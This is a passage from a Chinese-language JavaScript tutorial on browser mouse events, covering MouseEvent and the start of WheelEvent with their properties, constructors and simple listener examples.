\u4e8b\u4ef6\uff0c\u4f46\u662f\u4f1a\u89e6\u53d1 mouseover \u4e8b\u4ef6\u3002 mouseout \u4e8b\u4ef6\u548c mouseleave \u4e8b\u4ef6\uff0c\u90fd\u662f\u9f20\u6807\u79bb\u5f00\u4e00\u4e2a\u8282\u70b9\u65f6\u89e6\u53d1\u3002\u4e24\u8005\u7684\u533a\u522b\u662f\uff0c\u5728\u7236\u5143\u7d20\u5185\u90e8\u79bb\u5f00\u4e00\u4e2a\u5b50\u5143\u7d20\u65f6\uff0c mouseleave \u4e8b\u4ef6\u4e0d\u4f1a\u89e6\u53d1\uff0c\u800c mouseout \u4e8b\u4ef6\u4f1a\u89e6\u53d1\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 /* HTML \u4ee3\u7801\u5982\u4e0b <ul> <li>item 1</li> <li>item 2</li> <li>item 3</li> </ul> */ var ul = document . querySelector ( 'ul' ); // \u5148\u8fdb\u5165 ul \u8282\u70b9\uff0c\u7136\u540e\u5728\u8282\u70b9\u5185\u90e8\u79fb\u52a8\uff0c\u4e0d\u4f1a\u89e6\u53d1 mouseleave \u4e8b\u4ef6 // \u53ea\u6709\u79bb\u5f00 ul \u8282\u70b9\u65f6\uff0c\u89e6\u53d1\u4e00\u6b21 mouseleave // event.target \u662f ul \u8282\u70b9 ul . addEventListener ( 'mouseleave' , function ( event ) { event . target . style . color = 'purple' ; setTimeout ( function () { event . target . style . color = '' ; }, 500 ); }, false ); // \u5148\u8fdb\u5165 ul \u8282\u70b9\uff0c\u7136\u540e\u5728\u8282\u70b9\u5185\u90e8\u79fb\u52a8\uff0cmouseout \u4e8b\u4ef6\u4f1a\u89e6\u53d1\u591a\u6b21 // event.target \u662f li \u8282\u70b9 ul . addEventListener ( 'mouseout' , function ( event ) { event . target . style . color = 'orange' ; setTimeout ( function () { event . target . style . color = '' ; }, 500 ); }, false ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5728\u7236\u8282\u70b9\u5185\u90e8\u79bb\u5f00\u5b50\u8282\u70b9\uff0c\u4e0d\u4f1a\u89e6\u53d1 mouseleave \u4e8b\u4ef6\uff0c\u4f46\u662f\u4f1a\u89e6\u53d1 mouseout \u4e8b\u4ef6\u3002 \uff083\uff09\u5176\u4ed6\u4e8b\u4ef6 contextmenu \uff1a\u6309\u4e0b\u9f20\u6807\u53f3\u952e\u65f6\uff08\u4e0a\u4e0b\u6587\u83dc\u5355\u51fa\u73b0\u524d\uff09\u89e6\u53d1\uff0c\u6216\u8005\u6309\u4e0b\u201c\u4e0a\u4e0b\u6587\u201d\u83dc\u5355\u952e\u65f6\u89e6\u53d1\u3002 wheel \uff1a\u6eda\u52a8\u9f20\u6807\u7684\u6eda\u8f6e\u65f6\u89e6\u53d1\uff0c\u8be5\u4e8b\u4ef6\u7ee7\u627f\u7684\u662f WheelEvent \u63a5\u53e3\u3002 MouseEvent \u63a5\u53e3 \u00b6 MouseEvent \u63a5\u53e3\u4ee3\u8868\u4e86\u9f20\u6807\u76f8\u5173\u7684\u4e8b\u4ef6\uff0c\u5355\u51fb\uff08click\uff09\u3001\u53cc\u51fb\uff08dblclick\uff09\u3001\u677e\u5f00\u9f20\u6807\u952e\uff08mouseup\uff09\u3001\u6309\u4e0b\u9f20\u6807\u952e\uff08mousedown\uff09\u7b49\u52a8\u4f5c\uff0c\u6240\u4ea7\u751f\u7684\u4e8b\u4ef6\u5bf9\u8c61\u90fd\u662f MouseEvent \u5b9e\u4f8b\u3002\u6b64\u5916\uff0c\u6eda\u8f6e\u4e8b\u4ef6\u548c\u62d6\u62c9\u4e8b\u4ef6\u4e5f\u662f MouseEvent \u5b9e\u4f8b\u3002 MouseEvent \u63a5\u53e3\u7ee7\u627f\u4e86 Event \u63a5\u53e3\uff0c\u6240\u4ee5\u62e5\u6709 Event \u7684\u6240\u6709\u5c5e\u6027\u548c\u65b9\u6cd5\uff0c\u5e76\u4e14\u8fd8\u63d0\u4f9b\u9f20\u6807\u72ec\u6709\u7684\u5c5e\u6027\u548c\u65b9\u6cd5\u3002 \u6d4f\u89c8\u5668\u539f\u751f\u63d0\u4f9b\u4e00\u4e2a MouseEvent() \u6784\u9020\u51fd\u6570\uff0c\u7528\u4e8e\u65b0\u5efa\u4e00\u4e2a MouseEvent \u5b9e\u4f8b\u3002 1 var event = new MouseEvent ( type , options ); MouseEvent() \u6784\u9020\u51fd\u6570\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\u3002\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u4e8b\u4ef6\u540d\u79f0\uff1b\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u4e00\u4e2a\u4e8b\u4ef6\u914d\u7f6e\u5bf9\u8c61\uff0c\u8be5\u53c2\u6570\u53ef\u9009\u3002\u9664\u4e86 Event \u63a5\u53e3\u7684\u5b9e\u4f8b\u914d\u7f6e\u5c5e\u6027\uff0c\u8be5\u5bf9\u8c61\u53ef\u4ee5\u914d\u7f6e\u4ee5\u4e0b\u5c5e\u6027\uff0c\u6240\u6709\u5c5e\u6027\u90fd\u662f\u53ef\u9009\u7684\u3002 screenX \uff1a\u6570\u503c\uff0c\u9f20\u6807\u76f8\u5bf9\u4e8e\u5c4f\u5e55\u7684\u6c34\u5e73\u4f4d\u7f6e\uff08\u5355\u4f4d\u50cf\u7d20\uff09\uff0c\u9ed8\u8ba4\u503c\u4e3a0\uff0c\u8bbe\u7f6e\u8be5\u5c5e\u6027\u4e0d\u4f1a\u79fb\u52a8\u9f20\u6807\u3002 screenY \uff1a\u6570\u503c\uff0c\u9f20\u6807\u76f8\u5bf9\u4e8e\u5c4f\u5e55\u7684\u5782\u76f4\u4f4d\u7f6e\uff08\u5355\u4f4d\u50cf\u7d20\uff09\uff0c\u5176\u4ed6\u4e0e screenX \u76f8\u540c\u3002 clientX \uff1a\u6570\u503c\uff0c\u9f20\u6807\u76f8\u5bf9\u4e8e\u7a0b\u5e8f\u7a97\u53e3\u7684\u6c34\u5e73\u4f4d\u7f6e\uff08\u5355\u4f4d\u50cf\u7d20\uff09\uff0c\u9ed8\u8ba4\u503c\u4e3a0\uff0c\u8bbe\u7f6e\u8be5\u5c5e\u6027\u4e0d\u4f1a\u79fb\u52a8\u9f20\u6807\u3002 clientY \uff1a\u6570\u503c\uff0c\u9f20\u6807\u76f8\u5bf9\u4e8e\u7a0b\u5e8f\u7a97\u53e3\u7684\u5782\u76f4\u4f4d\u7f6e\uff08\u5355\u4f4d\u50cf\u7d20\uff09\uff0c\u5176\u4ed6\u4e0e clientX \u76f8\u540c\u3002 ctrlKey \uff1a\u5e03\u5c14\u503c\uff0c\u662f\u5426\u540c\u65f6\u6309\u4e0b\u4e86 Ctrl \u952e\uff0c\u9ed8\u8ba4\u503c\u4e3a false \u3002 shiftKey \uff1a\u5e03\u5c14\u503c\uff0c\u662f\u5426\u540c\u65f6\u6309\u4e0b\u4e86 Shift \u952e\uff0c\u9ed8\u8ba4\u503c\u4e3a false \u3002 altKey \uff1a\u5e03\u5c14\u503c\uff0c\u662f\u5426\u540c\u65f6\u6309\u4e0b Alt \u952e\uff0c\u9ed8\u8ba4\u503c\u4e3a false \u3002 metaKey \uff1a\u5e03\u5c14\u503c\uff0c\u662f\u5426\u540c\u65f6\u6309\u4e0b Meta \u952e\uff0c\u9ed8\u8ba4\u503c\u4e3a false \u3002 button \uff1a\u6570\u503c\uff0c\u8868\u793a\u6309\u4e0b\u4e86\u54ea\u4e00\u4e2a\u9f20\u6807\u6309\u952e\uff0c\u9ed8\u8ba4\u503c\u4e3a 0 \uff0c\u8868\u793a\u6309\u4e0b\u4e3b\u952e\uff08\u901a\u5e38\u662f\u9f20\u6807\u7684\u5de6\u952e\uff09\u6216\u8005\u5f53\u524d\u4e8b\u4ef6\u6ca1\u6709\u5b9a\u4e49\u8fd9\u4e2a\u5c5e\u6027\uff1b 1 \u8868\u793a\u6309\u4e0b\u8f85\u52a9\u952e\uff08\u901a\u5e38\u662f\u9f20\u6807\u7684\u4e2d\u95f4\u952e\uff09\uff0c 2 \u8868\u793a\u6309\u4e0b\u6b21\u8981\u952e\uff08\u901a\u5e38\u662f\u9f20\u6807\u7684\u53f3\u952e\uff09\u3002 buttons \uff1a\u6570\u503c\uff0c\u8868\u793a\u6309\u4e0b\u4e86\u9f20\u6807\u7684\u54ea\u4e9b\u952e\uff0c\u662f\u4e00\u4e2a\u4e09\u4e2a\u6bd4\u7279\u4f4d\u7684\u4e8c\u8fdb\u5236\u503c\uff0c\u9ed8\u8ba4\u4e3a 0 \uff08\u6ca1\u6709\u6309\u4e0b\u4efb\u4f55\u952e\uff09\u3002 1 \uff08\u4e8c\u8fdb\u5236 001 \uff09\u8868\u793a\u6309\u4e0b\u4e3b\u952e\uff08\u901a\u5e38\u662f\u5de6\u952e\uff09\uff0c 2 \uff08\u4e8c\u8fdb\u5236 010 \uff09\u8868\u793a\u6309\u4e0b\u6b21\u8981\u952e\uff08\u901a\u5e38\u662f\u53f3\u952e\uff09\uff0c 4 \uff08\u4e8c\u8fdb\u5236 100 \uff09\u8868\u793a\u6309\u4e0b\u8f85\u52a9\u952e\uff08\u901a\u5e38\u662f\u4e2d\u95f4\u952e\uff09\u3002\u56e0\u6b64\uff0c\u5982\u679c\u8fd4\u56de 3 \uff08\u4e8c\u8fdb\u5236 011 \uff09\u5c31\u8868\u793a\u540c\u65f6\u6309\u4e0b\u4e86\u5de6\u952e\u548c\u53f3\u952e\u3002 relatedTarget \uff1a\u8282\u70b9\u5bf9\u8c61\uff0c\u8868\u793a\u4e8b\u4ef6\u7684\u76f8\u5173\u8282\u70b9\uff0c\u9ed8\u8ba4\u4e3a null \u3002 mouseenter \u548c mouseover \u4e8b\u4ef6\u65f6\uff0c\u8868\u793a\u9f20\u6807\u521a\u521a\u79bb\u5f00\u7684\u90a3\u4e2a\u5143\u7d20\u8282\u70b9\uff1b mouseout \u548c mouseleave \u4e8b\u4ef6\u65f6\uff0c\u8868\u793a\u9f20\u6807\u6b63\u5728\u8fdb\u5165\u7684\u90a3\u4e2a\u5143\u7d20\u8282\u70b9\u3002 \u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 8 function simulateClick () { var event = new MouseEvent ( 'click' , { 'bubbles' : true , 'cancelable' : true }); var cb = document . getElementById ( 'checkbox' ); cb . dispatchEvent ( event ); } \u4e0a\u9762\u4ee3\u7801\u751f\u6210\u4e00\u4e2a\u9f20\u6807\u70b9\u51fb\u4e8b\u4ef6\uff0c\u5e76\u89e6\u53d1\u8be5\u4e8b\u4ef6\u3002 MouseEvent \u63a5\u53e3\u7684\u5b9e\u4f8b\u5c5e\u6027 \u00b6 MouseEvent.altKey\uff0cMouseEvent.ctrlKey\uff0cMouseEvent.metaKey\uff0cMouseEvent.shiftKey \u00b6 MouseEvent.altKey \u3001 MouseEvent.ctrlKey \u3001 MouseEvent.metaKey \u3001 MouseEvent.shiftKey \u8fd9\u56db\u4e2a\u5c5e\u6027\u90fd\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u4e8b\u4ef6\u53d1\u751f\u65f6\uff0c\u662f\u5426\u6309\u4e0b\u5bf9\u5e94\u7684\u952e\u3002\u5b83\u4eec\u90fd\u662f\u53ea\u8bfb\u5c5e\u6027\u3002 altKey \u5c5e\u6027\uff1aAlt \u952e ctrlKey \u5c5e\u6027\uff1aCtrl \u952e metaKey \u5c5e\u6027\uff1aMeta \u952e\uff08Mac \u952e\u76d8\u662f\u4e00\u4e2a\u56db\u74e3\u7684\u5c0f\u82b1\uff0cWindows \u952e\u76d8\u662f Windows \u952e\uff09 shiftKey \u5c5e\u6027\uff1aShift \u952e 1 2 3 4 5 6 7 8 // HTML \u4ee3\u7801\u5982\u4e0b // <body onclick=\"showKey(event)\"> function showKey ( e ) { console . log ( 'ALT key pressed: ' + e . altKey ); console . log ( 'CTRL key pressed: ' + e . ctrlKey ); console . log ( 'META key pressed: ' + e . metaKey ); console . log ( 'SHIFT key pressed: ' + e . shiftKey ); } \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u70b9\u51fb\u7f51\u9875\u4f1a\u8f93\u51fa\u662f\u5426\u540c\u65f6\u6309\u4e0b\u5bf9\u5e94\u7684\u952e\u3002 MouseEvent.button\uff0cMouseEvent.buttons \u00b6 MouseEvent.button \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u6570\u503c\uff0c\u8868\u793a\u4e8b\u4ef6\u53d1\u751f\u65f6\u6309\u4e0b\u4e86\u9f20\u6807\u7684\u54ea\u4e2a\u952e\u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002 0\uff1a\u6309\u4e0b\u4e3b\u952e\uff08\u901a\u5e38\u662f\u5de6\u952e\uff09\uff0c\u6216\u8005\u8be5\u4e8b\u4ef6\u6ca1\u6709\u521d\u59cb\u5316\u8fd9\u4e2a\u5c5e\u6027\uff08\u6bd4\u5982 mousemove \u4e8b\u4ef6\uff09\u3002 1\uff1a\u6309\u4e0b\u8f85\u52a9\u952e\uff08\u901a\u5e38\u662f\u4e2d\u952e\u6216\u8005\u6eda\u8f6e\u952e\uff09\u3002 2\uff1a\u6309\u4e0b\u6b21\u952e\uff08\u901a\u5e38\u662f\u53f3\u952e\uff09\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 // HTML \u4ee3\u7801\u4e3a // <button onmouseup=\"whichButton(event)\">\u70b9\u51fb</button> var whichButton = function ( e ) { switch ( e . button ) { case 0 : console . log ( 'Left button clicked.' ); break ; case 1 : console . log ( 'Middle button clicked.' ); break ; case 2 : console . log ( 'Right button clicked.' ); break ; default : console . log ( 'Unexpected code: ' + e . button ); } } MouseEvent.buttons \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u4e09\u4e2a\u6bd4\u7279\u4f4d\u7684\u503c\uff0c\u8868\u793a\u540c\u65f6\u6309\u4e0b\u4e86\u54ea\u4e9b\u952e\u3002\u5b83\u7528\u6765\u5904\u7406\u540c\u65f6\u6309\u4e0b\u591a\u4e2a\u9f20\u6807\u952e\u7684\u60c5\u51b5\u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002 1\uff1a\u4e8c\u8fdb\u5236\u4e3a 001 \uff08\u5341\u8fdb\u5236\u76841\uff09\uff0c\u8868\u793a\u6309\u4e0b\u5de6\u952e\u3002 2\uff1a\u4e8c\u8fdb\u5236\u4e3a 010 \uff08\u5341\u8fdb\u5236\u76842\uff09\uff0c\u8868\u793a\u6309\u4e0b\u53f3\u952e\u3002 4\uff1a\u4e8c\u8fdb\u5236\u4e3a 100 \uff08\u5341\u8fdb\u5236\u76844\uff09\uff0c\u8868\u793a\u6309\u4e0b\u4e2d\u952e\u6216\u6eda\u8f6e\u952e\u3002 \u540c\u65f6\u6309\u4e0b\u591a\u4e2a\u952e\u7684\u65f6\u5019\uff0c\u6bcf\u4e2a\u6309\u4e0b\u7684\u952e\u5bf9\u5e94\u7684\u6bd4\u7279\u4f4d\u90fd\u4f1a\u6709\u503c\u3002\u6bd4\u5982\uff0c\u540c\u65f6\u6309\u4e0b\u5de6\u952e\u548c\u53f3\u952e\uff0c\u4f1a\u8fd4\u56de3\uff08\u4e8c\u8fdb\u5236\u4e3a011\uff09\u3002 MouseEvent.clientX\uff0cMouseEvent.clientY \u00b6 MouseEvent.clientX \u5c5e\u6027\u8fd4\u56de\u9f20\u6807\u4f4d\u7f6e\u76f8\u5bf9\u4e8e\u6d4f\u89c8\u5668\u7a97\u53e3\u5de6\u4e0a\u89d2\u7684\u6c34\u5e73\u5750\u6807\uff08\u5355\u4f4d\u50cf\u7d20\uff09\uff0c MouseEvent.clientY \u5c5e\u6027\u8fd4\u56de\u5782\u76f4\u5750\u6807\u3002\u8fd9\u4e24\u4e2a\u5c5e\u6027\u90fd\u662f\u53ea\u8bfb\u5c5e\u6027\u3002 1 2 3 4 5 6 7 8 // HTML \u4ee3\u7801\u4e3a // <body onmousedown=\"showCoords(event)\"> function showCoords ( evt ){ console . log ( 'clientX value: ' + evt . clientX + '\\n' + 'clientY value: ' + evt . clientY + '\\n' ); } \u8fd9\u4e24\u4e2a\u5c5e\u6027\u8fd8\u5206\u522b\u6709\u4e00\u4e2a\u522b\u540d MouseEvent.x \u548c MouseEvent.y \u3002 MouseEvent.movementX\uff0cMouseEvent.movementY \u00b6 MouseEvent.movementX \u5c5e\u6027\u8fd4\u56de\u5f53\u524d\u4f4d\u7f6e\u4e0e\u4e0a\u4e00\u4e2a mousemove \u4e8b\u4ef6\u4e4b\u95f4\u7684\u6c34\u5e73\u8ddd\u79bb\uff08\u5355\u4f4d\u50cf\u7d20\uff09\u3002\u6570\u503c\u4e0a\uff0c\u5b83\u7b49\u4e8e\u4e0b\u9762\u7684\u8ba1\u7b97\u516c\u5f0f\u3002 1 currentEvent . movementX = currentEvent . screenX - previousEvent . screenX MouseEvent.movementY \u5c5e\u6027\u8fd4\u56de\u5f53\u524d\u4f4d\u7f6e\u4e0e\u4e0a\u4e00\u4e2a mousemove \u4e8b\u4ef6\u4e4b\u95f4\u7684\u5782\u76f4\u8ddd\u79bb\uff08\u5355\u4f4d\u50cf\u7d20\uff09\u3002\u6570\u503c\u4e0a\uff0c\u5b83\u7b49\u4e8e\u4e0b\u9762\u7684\u8ba1\u7b97\u516c\u5f0f\u3002 1 currentEvent . movementY = currentEvent . screenY - previousEvent . screenY \u3002 \u8fd9\u4e24\u4e2a\u5c5e\u6027\u90fd\u662f\u53ea\u8bfb\u5c5e\u6027\u3002 MouseEvent.screenX\uff0cMouseEvent.screenY \u00b6 MouseEvent.screenX \u5c5e\u6027\u8fd4\u56de\u9f20\u6807\u4f4d\u7f6e\u76f8\u5bf9\u4e8e\u5c4f\u5e55\u5de6\u4e0a\u89d2\u7684\u6c34\u5e73\u5750\u6807\uff08\u5355\u4f4d\u50cf\u7d20\uff09\uff0c MouseEvent.screenY \u5c5e\u6027\u8fd4\u56de\u5782\u76f4\u5750\u6807\u3002\u8fd9\u4e24\u4e2a\u5c5e\u6027\u90fd\u662f\u53ea\u8bfb\u5c5e\u6027\u3002 1 2 3 4 5 6 7 8 // HTML \u4ee3\u7801\u5982\u4e0b // <body onmousedown=\"showCoords(event)\"> function showCoords ( evt ) { console . log ( 'screenX value: ' + evt . screenX + '\\n' , 'screenY value: ' + evt . screenY + '\\n' ); } MouseEvent.offsetX\uff0cMouseEvent.offsetY \u00b6 MouseEvent.offsetX \u5c5e\u6027\u8fd4\u56de\u9f20\u6807\u4f4d\u7f6e\u4e0e\u76ee\u6807\u8282\u70b9\u5de6\u4fa7\u7684 padding \u8fb9\u7f18\u7684\u6c34\u5e73\u8ddd\u79bb\uff08\u5355\u4f4d\u50cf\u7d20\uff09\uff0c MouseEvent.offsetY \u5c5e\u6027\u8fd4\u56de\u4e0e\u76ee\u6807\u8282\u70b9\u4e0a\u65b9\u7684 padding \u8fb9\u7f18\u7684\u5782\u76f4\u8ddd\u79bb\u3002\u8fd9\u4e24\u4e2a\u5c5e\u6027\u90fd\u662f\u53ea\u8bfb\u5c5e\u6027\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 /* HTML \u4ee3\u7801\u5982\u4e0b <style> p { width: 100px; height: 100px; padding: 100px; } </style> <p>Hello</p> */ var p = document . querySelector ( 'p' ); p . addEventListener ( 'click' , function ( e ) { console . log ( e . offsetX ); console . log ( e . offsetY ); }, false ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u9f20\u6807\u5982\u679c\u5728 p \u5143\u7d20\u7684\u4e2d\u5fc3\u4f4d\u7f6e\u70b9\u51fb\uff0c\u4f1a\u8fd4\u56de 150 150 \u3002\u56e0\u6b64\u4e2d\u5fc3\u4f4d\u7f6e\u8ddd\u79bb\u5de6\u4fa7\u548c\u4e0a\u65b9\u7684 padding \u8fb9\u7f18\uff0c\u7b49\u4e8e padding \u7684\u5bbd\u5ea6\uff08100\u50cf\u7d20\uff09\u52a0\u4e0a\u5143\u7d20\u5185\u5bb9\u533a\u57df\u4e00\u534a\u7684\u5bbd\u5ea6\uff0850\u50cf\u7d20\uff09\u3002 MouseEvent.pageX\uff0cMouseEvent.pageY \u00b6 MouseEvent.pageX \u5c5e\u6027\u8fd4\u56de\u9f20\u6807\u4f4d\u7f6e\u4e0e\u6587\u6863\u5de6\u4fa7\u8fb9\u7f18\u7684\u8ddd\u79bb\uff08\u5355\u4f4d\u50cf\u7d20\uff09\uff0c MouseEvent.pageY \u5c5e\u6027\u8fd4\u56de\u4e0e\u6587\u6863\u4e0a\u4fa7\u8fb9\u7f18\u7684\u8ddd\u79bb\uff08\u5355\u4f4d\u50cf\u7d20\uff09\u3002\u5b83\u4eec\u7684\u8fd4\u56de\u503c\u90fd\u5305\u62ec\u6587\u6863\u4e0d\u53ef\u89c1\u7684\u90e8\u5206\u3002\u8fd9\u4e24\u4e2a\u5c5e\u6027\u90fd\u662f\u53ea\u8bfb\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 /* HTML \u4ee3\u7801\u5982\u4e0b <style> body { height: 2000px; } </style> */ document . body . addEventListener ( 'click' , function ( e ) { console . log ( e . pageX ); console . log ( e . pageY ); }, false ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u9875\u9762\u9ad8\u5ea6\u4e3a2000\u50cf\u7d20\uff0c\u4f1a\u4ea7\u751f\u5782\u76f4\u6eda\u52a8\u6761\u3002\u6eda\u52a8\u5230\u9875\u9762\u5e95\u90e8\uff0c\u70b9\u51fb\u9f20\u6807\u8f93\u51fa\u7684 pageY \u503c\u4f1a\u63a5\u8fd12000\u3002 MouseEvent.relatedTarget \u00b6 MouseEvent.relatedTarget \u5c5e\u6027\u8fd4\u56de\u4e8b\u4ef6\u7684\u76f8\u5173\u8282\u70b9\u3002\u5bf9\u4e8e\u90a3\u4e9b\u6ca1\u6709\u76f8\u5173\u8282\u70b9\u7684\u4e8b\u4ef6\uff0c\u8be5\u5c5e\u6027\u8fd4\u56de null \u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002 \u4e0b\u8868\u5217\u51fa\u4e0d\u540c\u4e8b\u4ef6\u7684 target \u5c5e\u6027\u503c\u548c relatedTarget \u5c5e\u6027\u503c\u4e49\u3002 \u4e8b\u4ef6\u540d\u79f0 target \u5c5e\u6027 relatedTarget \u5c5e\u6027 focusin \u63a5\u53d7\u7126\u70b9\u7684\u8282\u70b9 \u4e27\u5931\u7126\u70b9\u7684\u8282\u70b9 focusout \u4e27\u5931\u7126\u70b9\u7684\u8282\u70b9 \u63a5\u53d7\u7126\u70b9\u7684\u8282\u70b9 mouseenter \u5c06\u8981\u8fdb\u5165\u7684\u8282\u70b9 \u5c06\u8981\u79bb\u5f00\u7684\u8282\u70b9 mouseleave \u5c06\u8981\u79bb\u5f00\u7684\u8282\u70b9 \u5c06\u8981\u8fdb\u5165\u7684\u8282\u70b9 mouseout \u5c06\u8981\u79bb\u5f00\u7684\u8282\u70b9 \u5c06\u8981\u8fdb\u5165\u7684\u8282\u70b9 mouseover \u5c06\u8981\u8fdb\u5165\u7684\u8282\u70b9 \u5c06\u8981\u79bb\u5f00\u7684\u8282\u70b9 dragenter \u5c06\u8981\u8fdb\u5165\u7684\u8282\u70b9 \u5c06\u8981\u79bb\u5f00\u7684\u8282\u70b9 dragexit \u5c06\u8981\u79bb\u5f00\u7684\u8282\u70b9 \u5c06\u8981\u8fdb\u5165\u7684\u8282\u70b9 \u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 /* HTML \u4ee3\u7801\u5982\u4e0b <div id=\"outer\" style=\"height:50px;width:50px;border:1px solid black;\"> <div id=\"inner\" style=\"height:25px;width:25px;border:1px solid black;\"></div> </div> */ var inner = document . getElementById ( 'inner' ); inner . addEventListener ( 'mouseover' , function ( event ) { console . log ( '\u8fdb\u5165' + event . target . id + ' \u79bb\u5f00' + event . relatedTarget . id ); }, false ); inner . addEventListener ( 'mouseenter' , function ( event ) { console . log ( '\u8fdb\u5165' + event . target . id + ' \u79bb\u5f00' + event . relatedTarget . id ); }); inner . addEventListener ( 'mouseout' , function ( event ) { console . log ( '\u79bb\u5f00' + event . target . id + ' \u8fdb\u5165' + event . relatedTarget . id ); }); inner . addEventListener ( \"mouseleave\" , function ( event ){ console . log ( '\u79bb\u5f00' + event . target . id + ' \u8fdb\u5165' + event . relatedTarget . id ); }); // \u9f20\u6807\u4ece outer \u8fdb\u5165inner\uff0c\u8f93\u51fa // \u8fdb\u5165inner \u79bb\u5f00outer // \u8fdb\u5165inner \u79bb\u5f00outer // \u9f20\u6807\u4ece inner\u8fdb\u5165 outer\uff0c\u8f93\u51fa // \u79bb\u5f00inner \u8fdb\u5165outer // \u79bb\u5f00inner \u8fdb\u5165outer MouseEvent \u63a5\u53e3\u7684\u5b9e\u4f8b\u65b9\u6cd5 \u00b6 MouseEvent.getModifierState() \u00b6 MouseEvent.getModifierState \u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u6709\u6ca1\u6709\u6309\u4e0b\u7279\u5b9a\u7684\u529f\u80fd\u952e\u3002\u5b83\u7684\u53c2\u6570\u662f\u4e00\u4e2a\u8868\u793a \u529f\u80fd\u952e \u7684\u5b57\u7b26\u4e32\u3002 1 2 3 document . addEventListener ( 'click' , function ( e ) { console . log ( e . getModifierState ( 'CapsLock' )); }, false ); \u4e0a\u9762\u7684\u4ee3\u7801\u53ef\u4ee5\u4e86\u89e3\u7528\u6237\u662f\u5426\u6309\u4e0b\u4e86\u5927\u5199\u952e\u3002 WheelEvent \u63a5\u53e3 \u00b6 \u6982\u8ff0 \u00b6 WheelEvent \u63a5\u53e3\u7ee7\u627f\u4e86 MouseEvent \u5b9e\u4f8b\uff0c\u4ee3\u8868\u9f20\u6807\u6eda\u8f6e\u4e8b\u4ef6\u7684\u5b9e\u4f8b\u5bf9\u8c61\u3002\u76ee\u524d\uff0c\u9f20\u6807\u6eda\u8f6e\u76f8\u5173\u7684\u4e8b\u4ef6\u53ea\u6709\u4e00\u4e2a wheel \u4e8b\u4ef6\uff0c\u7528\u6237\u6eda\u52a8\u9f20\u6807\u7684\u6eda\u8f6e\uff0c\u5c31\u751f\u6210\u8fd9\u4e2a\u4e8b\u4ef6\u7684\u5b9e\u4f8b\u3002 \u6d4f\u89c8\u5668\u539f\u751f\u63d0\u4f9b WheelEvent() \u6784\u9020\u51fd\u6570\uff0c\u7528\u6765\u751f\u6210 WheelEvent \u5b9e\u4f8b\u3002 1 var wheelEvent = new WheelEvent ( type , options ); WheelEvent() \u6784\u9020\u51fd\u6570\u53ef\u4ee5\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\uff0c\u7b2c\u4e00\u4e2a\u662f\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u4e8b\u4ef6\u7c7b\u578b\uff0c\u5bf9\u4e8e\u6eda\u8f6e\u4e8b\u4ef6\u6765\u8bf4\uff0c\u8fd9\u4e2a\u503c\u76ee\u524d\u53ea\u80fd\u662f wheel \u3002\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u4e8b\u4ef6\u7684\u914d\u7f6e\u5bf9\u8c61\u3002\u8be5\u5bf9\u8c61\u7684\u5c5e\u6027\u9664\u4e86 Event \u3001 UIEvent \u7684\u914d\u7f6e\u5c5e\u6027\u4ee5\u5916\uff0c\u8fd8\u53ef\u4ee5\u63a5\u53d7\u4ee5\u4e0b\u51e0\u4e2a\u5c5e\u6027\uff0c\u6240\u6709\u5c5e\u6027\u90fd\u662f\u53ef\u9009\u7684\u3002 deltaX \uff1a\u6570\u503c\uff0c\u8868\u793a\u6eda\u8f6e\u7684\u6c34\u5e73\u6eda\u52a8\u91cf\uff0c\u9ed8\u8ba4\u503c\u662f 0.0\u3002 deltaY \uff1a\u6570\u503c\uff0c\u8868\u793a\u6eda\u8f6e\u7684\u5782\u76f4\u6eda\u52a8\u91cf\uff0c\u9ed8\u8ba4\u503c\u662f 0.0\u3002 deltaZ \uff1a\u6570\u503c\uff0c\u8868\u793a\u6eda\u8f6e\u7684 Z \u8f74\u6eda\u52a8\u91cf\uff0c\u9ed8\u8ba4\u503c\u662f 0.0\u3002 deltaMode \uff1a\u6570\u503c\uff0c\u8868\u793a\u76f8\u5173\u7684\u6eda\u52a8\u4e8b\u4ef6\u7684\u5355\u4f4d\uff0c\u9002\u7528\u4e8e\u4e0a\u9762\u4e09\u4e2a\u5c5e\u6027\u3002 0 \u8868\u793a\u6eda\u52a8\u5355\u4f4d\u4e3a\u50cf\u7d20\uff0c 1 \u8868\u793a\u5355\u4f4d\u4e3a\u884c\uff0c 2 \u8868\u793a\u5355\u4f4d\u4e3a\u9875\uff0c\u9ed8\u8ba4\u4e3a 0 \u3002 \u5b9e\u4f8b\u5c5e\u6027 \u00b6 WheelEvent \u4e8b\u4ef6\u5b9e\u4f8b\u9664\u4e86\u5177\u6709 Event \u548c MouseEvent \u7684\u5b9e\u4f8b\u5c5e\u6027\u548c\u5b9e\u4f8b\u65b9\u6cd5\uff0c\u8fd8\u6709\u4e00\u4e9b\u81ea\u5df1\u7684\u5b9e\u4f8b\u5c5e\u6027\uff0c\u4f46\u662f\u6ca1\u6709\u81ea\u5df1\u7684\u5b9e\u4f8b\u65b9\u6cd5\u3002 